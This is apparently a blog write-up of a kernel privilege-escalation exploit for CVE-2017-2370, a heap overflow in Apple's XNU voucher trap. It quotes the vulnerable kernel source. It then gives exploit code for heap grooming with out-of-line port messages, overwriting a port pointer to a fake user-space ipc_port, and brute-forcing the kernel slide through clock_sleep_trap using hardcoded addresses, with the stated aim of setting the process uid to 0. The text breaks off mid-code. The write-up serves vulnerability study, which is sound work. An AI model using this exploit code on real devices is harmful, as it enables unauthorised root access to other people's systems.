    <published>2021-11-04T00:54:55.000Z</published>
    <updated>2021-11-22T16:22:16.199Z</updated>
    
    <content type="html"><![CDATA[<h1>CVE-2017-2370</h1><h2 id="Bug">Bug</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span></span></span><br><span class="line"><span class="function">  <span class="title">mach_voucher_extract_attr_recipe_trap</span><span class="params">(struct mach_voucher_extract_attr_recipe_args *args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">ipc_voucher_t</span> voucher = IV_NULL;</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr = KERN_SUCCESS;</span><br><span class="line">    <span class="keyword">mach_msg_type_number_t</span> sz = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// recipe_size is a pointer</span></span><br><span class="line">    <span class="keyword">if</span> (copyin(args-&gt;recipe_size, (<span class="keyword">void</span> *)&amp;sz, <span class="keyword">sizeof</span>(sz)))     </span><br><span class="line">      <span class="keyword">return</span> KERN_MEMORY_ERROR;</span><br><span class="line">    <span class="comment">// now the value of sz is *(args-&gt;recipe_size)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sz &gt; MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE)</span><br><span class="line">      <span class="keyword">return</span> MIG_ARRAY_TOO_LARGE;</span><br><span class="line"></span><br><span class="line">    voucher = convert_port_name_to_voucher(args-&gt;voucher_name);</span><br><span class="line">    <span class="keyword">if</span> (voucher == IV_NULL)</span><br><span class="line">      <span class="keyword">return</span> MACH_SEND_INVALID_DEST;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">mach_msg_type_number_t</span> __assert_only max_sz = sz;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sz &lt; MACH_VOUCHER_TRAP_STACK_LIMIT) &#123;</span><br><span class="line">      <span class="comment">/* keep small recipes on the stack for speed */</span></span><br><span class="line">      <span class="keyword">uint8_t</span> krecipe[sz];</span><br><span class="line">      <span class="keyword">if</span> (copyin(args-&gt;recipe, (<span class="keyword">void</span> *)krecipe, sz)) &#123;</span><br><span class="line">        kr = KERN_MEMORY_ERROR;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">      &#125;</span><br><span class="line">      kr = mach_voucher_extract_attr_recipe(voucher, args-&gt;key,</span><br><span class="line">                                            (<span class="keyword">mach_voucher_attr_raw_recipe_t</span>)krecipe, &amp;sz);</span><br><span class="line">      assert(sz &lt;= max_sz);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (kr == KERN_SUCCESS &amp;&amp; sz &gt; <span class="number">0</span>)</span><br><span class="line">        kr = copyout(krecipe, (<span class="keyword">void</span> *)args-&gt;recipe, sz);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// krecipe is a pointer</span></span><br><span class="line">      <span class="keyword">uint8_t</span> *krecipe = kalloc((<span class="keyword">vm_size_t</span>)sz);</span><br><span class="line">      <span class="keyword">if</span> (!krecipe) &#123;</span><br><span class="line">        kr = KERN_RESOURCE_SHORTAGE;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// args-&gt;recipe_size is a pointer! A pointer is passed a length here, which cause a heap overflow.</span></span><br><span class="line">      <span class="keyword">if</span> (copyin(args-&gt;recipe, (<span class="keyword">void</span> *)krecipe, args-&gt;recipe_size)) &#123;</span><br><span class="line">        kfree(krecipe, (<span class="keyword">vm_size_t</span>)sz);</span><br><span class="line">        kr = KERN_MEMORY_ERROR;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      kr = mach_voucher_extract_attr_recipe(voucher, args-&gt;key,</span><br><span class="line">                                            (<span class="keyword">mach_voucher_attr_raw_recipe_t</span>)krecipe, &amp;sz);</span><br><span class="line">      assert(sz &lt;= max_sz);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (kr == KERN_SUCCESS &amp;&amp; sz &gt; <span class="number">0</span>)</span><br><span class="line">        kr = copyout(krecipe, (<span class="keyword">void</span> *)args-&gt;recipe, sz);</span><br><span class="line">      kfree(krecipe, (<span class="keyword">vm_size_t</span>)sz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kr = copyout(&amp;sz, args-&gt;recipe_size, <span class="keyword">sizeof</span>(sz));</span><br><span class="line"></span><br><span class="line">  done:</span><br><span class="line">    ipc_voucher_release(voucher);</span><br><span class="line">    <span class="keyword">return</span> kr;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>Luckily, args-&gt;recipe can be controlled in user mode, and <code>copyout</code> will stop when it meets an unmap memory. So we can also control the overflow length by umapping the memory.</p><h2 id="Exploit">Exploit</h2><p>When we send OOL ports</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">mach_msg_return_t</span></span></span><br><span class="line"><span class="function"><span class="title">ipc_kmsg_copyin_body</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">ipc_kmsg_t</span>kmsg,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">ipc_space_t</span>space,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">vm_map_t</span><span class="built_in">map</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">                <span class="keyword">case</span> MACH_MSG_OOL_PORTS_DESCRIPTOR: </span><br><span class="line">                user_addr = ipc_kmsg_copyin_ool_ports_descriptor((<span class="keyword">mach_msg_ool_ports_descriptor_t</span> *)kern_addr, </span><br><span class="line">                        user_addr, is_task_64bit, <span class="built_in">map</span>, space, dest, kmsg, &amp;mr);</span><br><span class="line">                kern_addr++;</span><br><span class="line">                <span class="built_in">complex</span> = TRUE;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>will call ```ipc_kmsg_copyin_ool_ports_descriptor``` to read ool ports and allocate memory for it</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```c</span><br><span class="line">mach_msg_descriptor_t *</span><br><span class="line">ipc_kmsg_copyin_ool_ports_descriptor(</span><br><span class="line">        mach_msg_ool_ports_descriptor_t *dsc,</span><br><span class="line">        mach_msg_descriptor_t *user_dsc,</span><br><span class="line">        int is_64bit,</span><br><span class="line">        vm_map_t map,</span><br><span class="line">        ipc_space_t space,</span><br><span class="line">        ipc_object_t dest,</span><br><span class="line">        ipc_kmsg_t kmsg,</span><br><span class="line">        mach_msg_return_t *mr)</span><br><span class="line">&#123;</span><br><span class="line">    // ...</span><br><span class="line"></span><br><span class="line">    ports_length = count * sizeof(mach_port_t);</span><br><span class="line">    names_length = count * sizeof(mach_port_name_t);</span><br><span class="line"></span><br><span class="line">    if (ports_length == 0) &#123;</span><br><span class="line">        return user_dsc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = kalloc(ports_length);</span><br><span class="line">    // ...</span><br><span class="line"></span><br><span class="line">    objects = (ipc_object_t *) data;</span><br><span class="line">    dsc-&gt;address = data;</span><br><span class="line"></span><br><span class="line">    for ( i = 0; i &lt; count; i++) &#123;</span><br><span class="line">        mach_port_name_t name = names[i];</span><br><span class="line">        ipc_object_t object;</span><br><span class="line"></span><br><span class="line">        if (!MACH_PORT_VALID(name)) &#123;</span><br><span class="line">            objects[i] = (ipc_object_t)CAST_MACH_NAME_TO_PORT(name);</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It will be cast to <code>ipc_object_t</code>, a pointer to <code>ipc_object</code>. So we can try to send many <code>MACH_PORT_DEAD</code> to kalloc.256 and overwrite them later and make it point to a fake <code>ipc_object</code> in user space.</p><p>After copyout, the memory will be free.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">mach_msg_descriptor_t</span> *</span></span><br><span class="line"><span class="function"><span class="title">ipc_kmsg_copyout_ool_ports_descriptor</span><span class="params">(<span class="keyword">mach_msg_ool_ports_descriptor_t</span> *dsc,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">mach_msg_descriptor_t</span> *user_dsc,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">int</span> is_64bit,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">vm_map_t</span> <span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">ipc_space_t</span> space,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">ipc_kmsg_t</span> kmsg,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">mach_msg_return_t</span> *mr)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">          <span class="keyword">if</span> (rcv_addr != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">mach_port_t</span> *objects = (<span class="keyword">mach_port_t</span> *) dsc-&gt;address;</span><br><span class="line">            <span class="keyword">mach_port_name_t</span> *names = (<span class="keyword">mach_port_name_t</span> *) dsc-&gt;address;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* copyout port rights carried in the message */</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; count ; i++) &#123;</span><br><span class="line">                <span class="keyword">ipc_object_t</span> object = (<span class="keyword">ipc_object_t</span>)objects[i];</span><br><span class="line"></span><br><span class="line">                *mr |= ipc_kmsg_copyout_object(space, object,</span><br><span class="line">                        disp, &amp;names[i]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* copyout to memory allocated above */</span></span><br><span class="line">            <span class="keyword">void</span> *data = dsc-&gt;address;</span><br><span class="line">            <span class="keyword">if</span> (copyoutmap(<span class="built_in">map</span>, data, rcv_addr, names_length) != KERN_SUCCESS)</span><br><span class="line">                *mr |= MACH_MSG_VM_SPACE;</span><br><span class="line">            kfree(data, ports_length);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Heap-Fengshui">Heap Fengshui</h3><p>Since iOS 9, Apple added <code>random_free_to_zone()</code> when calling <code>zcram</code> which will randomly insert element to the beginning or ending of <code>free_elements</code>. It will be called when try to expand the zone when zone is empty.  So we need some trick to control the memory layout of kernel zone.</p><p><code>zalloc</code> will call <code>try_alloc_from_zone</code>(called by <code>zalloc_internal</code> actually). It will return the first element in the <code>free_list</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// osfmk/kern/zalloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">vm_offset_t</span></span></span><br><span class="line"><span class="function"><span class="title">try_alloc_from_zone</span><span class="params">(<span class="keyword">zone_t</span> zone,</span></span></span><br><span class="line"><span class="params"><span class="function">                    <span class="keyword">boolean_t</span>* check_poison)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  element = (<span class="keyword">vm_offset_t</span>)page_metadata_get_freelist(page_meta);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">vm_offset_t</span> *primary = (<span class="keyword">vm_offset_t</span> *) element;</span><br><span class="line"><span class="keyword">vm_offset_t</span> *backup  = get_backup_ptr(zone-&gt;elem_size, primary);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Since the primary next pointer is xor&#x27;ed with zp_nopoison_cookie</span></span><br><span class="line"><span class="comment"> * for obfuscation, retrieve the original value back</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">vm_offset_t</span>  next_element          = *primary ^ zp_nopoison_cookie;</span><br><span class="line"><span class="keyword">vm_offset_t</span>  next_element_primary  = *primary;</span><br><span class="line"><span class="keyword">vm_offset_t</span>  next_element_backup   = *backup;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> element;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And <code>free_to_zone</code> will add free element to the front of <code>free_list</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">free_to_zone</span><span class="params">(<span class="keyword">zone_t</span>      zone,</span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="keyword">vm_offset_t</span> element,</span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="keyword">boolean_t</span>   poison)</span></span>;</span><br></pre></td></tr></table></figure><p>We use the following steps to control the memory layout</p><ul><li><p>First, send a lot of messages with OOL ports to kernel(don’t send to much messages here).</p></li><li><p>Then receive some messages to free some ports in kalloc.256.</p></li><li><p>Finally, send some messages again, then newly allocated memory will be allocated near the area that was just freed.</p></li></ul><h3 id="Overflow">Overflow</h3><p>Preparing parameter.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> cp_size = kalloc_size + <span class="number">8</span>;  <span class="comment">// 8 for overflow size</span></span><br><span class="line"><span class="keyword">uint64_t</span> roundup_size = roundup(cp_size, getpagesize());</span><br><span class="line"><span class="keyword">uint64_t</span> alloc_size = roundup_size + getpagesize();</span><br></pre></td></tr></table></figure><p>Allocating memory</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kr = mach_vm_allocate(mach_task_self(), &amp;map_addr, alloc_size, VM_FLAGS_ANYWHERE);</span><br></pre></td></tr></table></figure><p>Unmapping memory, so it will only copy the memory between <code>start</code> and <code>end</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> base = map_addr;</span><br><span class="line"><span class="keyword">uint64_t</span> end = base + roundup_size;</span><br><span class="line"></span><br><span class="line">kr = mach_vm_deallocate(mach_task_self(), end, getpagesize());<span class="comment">// unmap the memory</span></span><br><span class="line">   <span class="keyword">uint64_t</span> start = end - cp_size;</span><br></pre></td></tr></table></figure><p>Overwrite next port, make it point to our fakeport.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(recipe, <span class="number">0x41</span>, kalloc_size);</span><br><span class="line"><span class="built_in">memcpy</span>(recipe + kalloc_size, (<span class="keyword">uint8_t</span> *)&amp;fakeport, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>Finally, we can trigger the bug, <code>vp</code> is voucher port here.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kr = mach_voucher_extract_attr_recipe_trap(vp, <span class="number">1</span>, recipe, recipe_size);</span><br></pre></td></tr></table></figure><h3 id="Privilege-escalation">Privilege escalation</h3><p>Now the <code>mach_port_t</code> points to our fake <code>ipc_port</code> in user space, which is completely controlled by us. We need to spawn our root shell.</p><p>Let’s take a look at the <code>port</code> structure.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">port</span> &#123;</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">kauth_cred_t</span>p_ucred;<span class="comment">/* Process owner&#x27;s identity. (PL) */</span> <span class="comment">// offset: 0xe8</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucred</span> &#123;</span></span><br><span class="line">TAILQ_ENTRY(ucred)cr_link; <span class="comment">/* never modify this without KAUTH_CRED_HASH_LOCK */</span></span><br><span class="line">u_longcr_ref;<span class="comment">/* reference count */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_cred</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The credential hash depends on everything from this point on</span></span><br><span class="line"><span class="comment"> * (see kauth_cred_get_hashkey)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uid_t</span>cr_uid;<span class="comment">/* effective user id */</span><span class="comment">// offset: 0x18</span></span><br><span class="line"><span class="keyword">uid_t</span>cr_ruid;<span class="comment">/* real user id */</span></span><br><span class="line"><span class="keyword">uid_t</span>cr_svuid;<span class="comment">/* saved user id */</span></span><br><span class="line"><span class="keyword">short</span>cr_ngroups;<span class="comment">/* number of groups in advisory list */</span></span><br><span class="line"><span class="keyword">gid_t</span>cr_groups[NGROUPS];<span class="comment">/* advisory group list */</span></span><br><span class="line"><span class="keyword">gid_t</span>cr_rgid;<span class="comment">/* real group id */</span></span><br><span class="line"><span class="keyword">gid_t</span>cr_svgid;<span class="comment">/* saved group id */</span></span><br><span class="line"><span class="keyword">uid_t</span>cr_gmuid;<span class="comment">/* UID for group membership purposes */</span></span><br><span class="line"><span class="keyword">int</span>cr_flags;<span class="comment">/* flags on credential */</span></span><br><span class="line">&#125; cr_posix;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">label</span>*<span class="title">cr_label</span>;</span><span class="comment">/* MAC label */</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> If anything else (besides the flags)</span></span><br><span class="line"><span class="comment"> * added after the label, you must change</span></span><br><span class="line"><span class="comment"> * kauth_cred_find().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">au_session</span> <span class="title">cr_audit</span>;</span><span class="comment">/* user auditing data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>If we can set  <code>uid_t cr_uid</code> to <code>0</code> then we can get root privilege. XNU kernel uses a link list called <code>allproc</code> to maintain the processes. So after getting kernel slide and get kernel memory rw we can easily overwrite our uid in <code>allproc</code>.</p><h3 id="KASLR">KASLR</h3><p>We already have an <code>ipc_port</code> fully controlled by us. Take a look at the following routine.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span></span></span><br><span class="line"><span class="function"><span class="title">clock_sleep_trap</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">struct clock_sleep_trap_args *args)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (clock_name == MACH_PORT_NULL)</span><br><span class="line">clock = &amp;clock_list[SYSTEM_CLOCK];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">clock = port_name_to_clock(clock_name);</span><br><span class="line"></span><br><span class="line">swtime.tv_sec  = sleep_sec;</span><br><span class="line">swtime.tv_nsec = sleep_nsec;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Call the actual clock_sleep routine.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">rvalue = clock_sleep_internal(clock, sleep_type, &amp;swtime);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>and <code>clock_sleep_internal</code> will return <code>KERN_FAILURE</code> when <code>clock != &amp;clock_list[SYSTEM_CLOCK]</code>.And <code>port_name_to_clock</code> returns <code>port-&gt;ip_kobject;</code>  So we can find the address of <code>clock_list</code> by brute force search.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span> kr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> clock_list = <span class="number">0xffffff8000a271c0</span>;   <span class="comment">// nm /System/Library/Kernel/kernel | grep _clock_list</span></span><br><span class="line"><span class="keyword">uint64_t</span> allproc = <span class="number">0xffffff8000abb490</span>;<span class="comment">// nm /System/Library/Kernel/kernel | grep allproc</span></span><br><span class="line"><span class="keyword">uint64_t</span> clock_list_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> base = <span class="number">0xffffff8000200000</span>;  <span class="comment">// kernel_base_addr = 0x200000 * slide_value + base</span></span><br><span class="line"><span class="keyword">uint64_t</span> kernel_slide = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">boolean_t</span> found_clock = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fakeport-&gt;io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;<span class="comment">// fake clock</span></span><br><span class="line">fakeport-&gt;io_lock_data[<span class="number">12</span>] = <span class="number">0x11</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xFFFF</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">0x200000</span> / <span class="number">8</span>; k += <span class="number">8</span>) &#123;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0x68</span>) = base + i * <span class="number">0x200000</span> + k;<span class="comment">// brute force, set fakeport-&gt;ip_kobject</span></span><br><span class="line">kr = clock_sleep_trap(port, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (kr != KERN_FAILURE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found clock_list! 0x%llx\n&quot;</span>, *(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0x68</span>));</span><br><span class="line">clock_list_addr = *(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0x68</span>);</span><br><span class="line">found_clock = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">goto</span> found;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>After finding clock, we can get kernel slide easily.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kernel_slide = clock_list_addr - clock_list;</span><br><span class="line">allproc += kernel_slide;</span><br></pre></td></tr></table></figure><h3 id="Read-arbitrary-kernel-memory">Read arbitrary kernel memory</h3><p>After reading XNU source code, we can find that</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span></span></span><br><span class="line"><span class="function"><span class="title">pid_for_task</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">struct 